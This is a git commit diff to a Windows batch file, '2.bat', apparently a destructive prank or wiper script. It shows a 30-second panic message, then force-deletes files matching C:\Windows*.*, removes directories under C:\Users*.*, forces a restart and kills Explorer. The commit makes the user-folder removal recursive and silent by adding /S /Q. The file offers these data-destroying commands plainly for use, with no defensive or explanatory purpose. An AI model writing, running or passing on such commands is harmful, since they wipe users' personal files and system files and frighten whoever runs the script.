fd5731bc1e04b6890dcaf15d2da3ffc78abe4751
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-09-14 23:32:47 -0700

    Update 2.bat

--- 2.bat
+++ 2.bat
@@ -1,7 +1,7 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
 del /F /s /q C:\Windows*.*
-rmdir C:\Users*.*
+rmdir C:\Users*.* /S /Q
 shutdown -r /o -t 30
 taskkill /im explorer.exe /f
 start explorer.exe
